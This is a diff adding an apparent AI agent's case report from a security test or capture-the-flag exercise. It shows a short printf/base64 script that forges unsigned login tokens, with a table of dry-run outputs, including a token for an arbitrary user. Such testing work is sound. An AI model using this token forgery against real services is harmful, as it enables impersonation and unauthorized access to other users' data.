@@ -1,0 +1,19 @@
+Done — the hint scheme is now a one-line printf, dry-run locally with zero network I/O.
+
+**Conversion** (from `GET /` hint: `token=base64({json uid}) ; notes?id= may not check ownership`):
+
+```bash
+payload=$(printf '{"uid": "%s", "user": "%s"}' "$uid" "$user")
+token=$(printf '%s' "$payload" | base64 | tr -d '\n')
+```
+
+**Dry-run result** (tools: `printf base64 od awk wc` — no curl, no socket):
+
+| case | output | match vs recorded evidence |
+|---|---|---|
+| uid=1 user=user | `eyJ1aWQiOiAiMSIsICJ1c2VyIjogInVzZXIifQ==` (40 chars, `==`, 1 segment on `.`) | == E-002/E-003/E-005 observed token: **YES** |
+| uid=1 user='' | `eyJ1aWQiOiAiMSIsICJ1c2VyIjogIiJ9` | == E-002 credential-less token: **YES** |
+| round-trip hex | `7b 22 75 69 64 22 3a 20 22 31 22 2c 20 22 75 73 65 72 22 3a 20 22 75 73 65 72 22 7d` (28 B) | == E-003/E-004 recorded hex: **identical** |
+| uid=7 user=mallory | `eyJ1aWQiOiAiNyIsICJ1c2VyIjogIm1hbGxvcnkifQ==` → `{"uid": "7", "user": "mallory"}` | free params, no credential/MAC step |
+
+Artifacts: evidence `E-007`, script `cases/login-token/scripts/hint-token-dryrun.sh`, finding recorded against `E-007/E-002/E-003`, `CASE.md` evidence list updated.
